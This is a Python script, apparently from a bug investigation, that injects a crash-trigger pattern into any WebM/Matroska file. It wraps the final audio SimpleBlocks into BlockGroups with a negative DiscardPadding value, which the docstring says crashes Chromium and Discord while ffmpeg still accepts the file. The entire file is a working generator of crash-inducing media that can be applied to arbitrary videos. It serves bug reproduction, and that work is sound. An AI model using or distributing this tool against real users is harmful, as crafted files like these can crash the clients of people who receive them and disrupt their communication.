#!/usr/bin/env python3
"""Inject the crash-trigger pattern into any WebM/Matroska file.

Root cause (see наблюдение дс.md and the bisection matrix):

    cat.webm contains 3 audio BlockGroups, each with a DiscardPadding child
    carrying a NEGATIVE value (-21354167 ns = -1025 samples @48 kHz). These
    are what crash Chromium/Discord. ffmpeg 7.x wrote them; ffmpeg 8.x rewrites
    them as plain SimpleBlocks without DiscardPadding and no longer crashes.

This tool reproduces the bug on arbitrary files: it wraps the last N audio
SimpleBlocks into BlockGroups and appends a negative DiscardPadding child,
exactly like the ffmpeg 7.1 mkv muxer did. The output still decodes cleanly
in ffmpeg (that is the point: ffmpeg accepts the file, Chromium does not).

Usage:
    python mkv_inject_crash.py in.webm out.webm [--count N] \
        [--discard-padding NS] [--positive] [--keep-keyframe-flag]
"""

import sys

sys.path.insert(0, ".")
from ebml_break import read_element_id, read_vint_size, encode_vint

ID_SEGMENT = 0x18538067
ID_CLUSTER = 0x1F43B675
ID_SIMPLEBLOCK = 0xA3
ID_BLOCKGROUP = 0xA0
ID_BLOCK = 0xA1
ID_DISCARDPADDING = 0x75A2

ID_TRACKS = 0x1654AE6B
ID_TRACKENTRY = 0xAE
ID_TRACKNUMBER = 0xD7
ID_TRACKTYPE = 0x83
ID_TIMESTAMP = 0xE7


def read_uint(data, pos, size):
    return int.from_bytes(data[pos:pos + size], "big")


def encode_size(value):
    for length in range(1, 9):
        maxv = (1 << (7 * length)) - 1
        # maxv is the reserved "unknown size" (all-ones) value; skip it.
        if value <= maxv and value != maxv:
            return encode_vint(value, length)
    raise ValueError("size too large: %d" % value)


def element_bytes(eid, content):
    nbytes = max(1, (eid.bit_length() + 7) // 8)
    return eid.to_bytes(nbytes, "big") + encode_size(len(content)) + content


def iter_elements(data, start, end):
    pos = start
    while pos < end:
        if end - pos < 2:
            break
        id_len, eid = read_element_id(data, pos)
        if id_len is None:
            break
        size_pos = pos + id_len
        size_len, size = read_vint_size(data, size_pos)
        if size_len is None:
            break
        content = size_pos + size_len
        total = id_len + size_len + size
        if content + size > end:
            break
        yield eid, pos, content, size, total
        pos = content + size


def parse_block(data, content, size):
    track_len = 1
    b0 = data[content]
    mask = 0x80
    while mask and not (b0 & mask):
        track_len += 1
        mask >>= 1
    _, track = read_vint_size(data, content)
    pos = content + track_len
    rel = int.from_bytes(data[pos:pos + 2], "big", signed=True)
    flags = data[pos + 2]
    payload = data[pos + 3:content + size]
    return track, track_len, rel, flags, payload


def find_audio_track(data):
    """Return the TrackNumber of the first audio track (TrackType == 2)."""
    seg = None
    for eid, pos, content, size, total in iter_elements(data, 0, len(data)):
        if eid == ID_SEGMENT:
            seg = (content, content + size)
            break
    tracks = None
    for eid, pos, content, size, total in iter_elements(data, seg[0], seg[1]):
        if eid == ID_TRACKS:
            tracks = (content, content + size)
            break
    for eid, pos, content, size, total in iter_elements(data, tracks[0], tracks[1]):
        if eid != ID_TRACKENTRY:
            continue
        num = ttype = None
        for cid, cpo, cc, cs, ct in iter_elements(data, content, content + size):
            if cid == ID_TRACKNUMBER:
                num = read_uint(data, cc, cs)
            elif cid == ID_TRACKTYPE:
                ttype = read_uint(data, cc, cs)
        if ttype == 2:
            return num
    return None


def build_blockgroup(track, rel, flags, payload, discard_ns):
    track_vint = encode_vint(track, 1) if track < 0x80 else encode_vint(track, 2)
    block_content = track_vint + rel.to_bytes(2, "big", signed=True) + bytes([flags]) + payload
    block = element_bytes(ID_BLOCK, block_content)
    # DiscardPadding is a signed integer (nanoseconds).
    pad_nbytes = max(1, ((discard_ns if discard_ns >= 0 else -discard_ns - 1).bit_length() + 8) // 8)
    pad = element_bytes(ID_DISCARDPADDING, discard_ns.to_bytes(pad_nbytes, "big", signed=True))
    return element_bytes(ID_BLOCKGROUP, block + pad)


def main(argv):
    if len(argv) < 3:
        print(__doc__, file=sys.stderr)
        return 2

    src, dst = argv[1], argv[2]
    count = 3
    discard_ns = -21354167  # = -1025 samples @ 48 kHz, exactly as in cat.webm
    keep_keyframe = False
    start_index = None
    min_step_ms = 0
    args = argv[3:]
    i = 0
    while i < len(args):
        a = args[i]
        if a == "--count" and i + 1 < len(args):
            count = int(args[i + 1]); i += 2; continue
        if a == "--discard-padding" and i + 1 < len(args):
            discard_ns = int(args[i + 1]); i += 2; continue
        if a == "--start-index" and i + 1 < len(args):
            start_index = int(args[i + 1]); i += 2; continue
        if a == "--min-step-ms" and i + 1 < len(args):
            min_step_ms = int(args[i + 1]); i += 2; continue
        if a == "--positive":
            discard_ns = abs(discard_ns); i += 1; continue
        if a == "--keep-keyframe-flag":
            keep_keyframe = True; i += 1; continue
        print("unknown arg: %s" % a, file=sys.stderr)
        return 2

    data = open(src, "rb").read()

    # Locate Segment.
    seg = None
    for eid, pos, content, size, total in iter_elements(data, 0, len(data)):
        if eid == ID_SEGMENT:
            seg = (pos, content, size)
            break
    if seg is None:
        print("no Segment", file=sys.stderr)
        return 1
    seg_pos, seg_content, seg_size = seg

    audio_track = find_audio_track(data)
    if audio_track is None:
        print("no audio track found", file=sys.stderr)
        return 1

    children = list(iter_elements(data, seg_content, seg_content + seg_size))

    # Collect every audio SimpleBlock as (cluster_idx, offset, content, size, abs_ts).
    refs = []
    cluster_of = {}
    for ci, (eid, pos, content, size, total) in enumerate(children):
        if eid != ID_CLUSTER:
            continue
        cluster_ts = 0
        for cid, cpo, cc, cs, ct in iter_elements(data, content, content + size):
            if cid == ID_TIMESTAMP:
                cluster_ts = int.from_bytes(data[cc:cc + cs], "big")
        for cid, cpo, cc, cs, ct in iter_elements(data, content, content + size):
            if cid != ID_SIMPLEBLOCK:
                continue
            track, track_len, rel, flags, payload = parse_block(data, cc, cs)
            if track == audio_track:
                refs.append((ci, cpo, cc, cs, cluster_ts + rel))
                cluster_of.setdefault(ci, []).append(cpo)

    if len(refs) < count:
        print("only %d audio blocks, requested %d" % (len(refs), count), file=sys.stderr)
        return 1

    if start_index is None:
        start_index = max(0, len(refs) - count)

    # Advance start_index until the selected run of `count` blocks has
    # inter-block steps >= min_step_ms (used to avoid micro blocks).
    if min_step_ms > 0:
        while start_index + count <= len(refs):
            steps = [refs[start_index + k][4] - refs[start_index + k - 1][4]
                     for k in range(1, count)]
            if all(s >= min_step_ms for s in steps):
                break
            start_index += 1
        else:
            print("no run of %d blocks with step >= %d ms" % (count, min_step_ms), file=sys.stderr)
            return 1

    if start_index + count > len(refs):
        print("start-index %d + count %d exceeds %d audio blocks" % (
            start_index, count, len(refs)), file=sys.stderr)
        return 1

    sel = refs[start_index:start_index + count]
    print("selected blocks at indices %d..%d (abs_ts=%s)" % (
        start_index, start_index + count - 1,
        [r[4] for r in sel]))

    targets = set(r[1] for r in sel)  # SimpleBlock offsets to wrap

    out = bytearray()
    injected = 0
    for ci, (eid, pos, content, size, total) in enumerate(children):
        if eid != ID_CLUSTER:
            out += data[pos:pos + total]
            continue
        cluster_out = bytearray()
        cpos = content
        cend = content + size
        while cpos < cend:
            cid_len, cid = read_element_id(data, cpos)
            if cid_len is None:
                break
            cszp = cpos + cid_len
            csz_len, csize = read_vint_size(data, cszp)
            if csz_len is None:
                break
            cc = cszp + csz_len
            raw = data[cpos:cc + csize]
            if cid == ID_SIMPLEBLOCK and cpos in targets:
                track, track_len, rel, flags, payload = parse_block(data, cc, csize)
                new_flags = flags if keep_keyframe else (flags & ~0x80)
                bg = build_blockgroup(track, rel, new_flags, payload, discard_ns)
                cluster_out += bg
                injected += 1
            else:
                cluster_out += raw
            cpos = cc + csize
        out += element_bytes(ID_CLUSTER, bytes(cluster_out))

    seg_new = element_bytes(ID_SEGMENT, bytes(out))
    new_data = data[:seg_pos] + seg_new + data[seg_pos + 4 + len(encode_size(seg_size)) + seg_size:]

    open(dst, "wb").write(new_data)
    print("audio_track=%d, injected=%d blockgroup(s), discard_padding=%d ns" % (
        audio_track, injected, discard_ns))
    print("old size=%d new size=%d" % (len(data), len(new_data)))
    print("wrote %s" % dst)
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
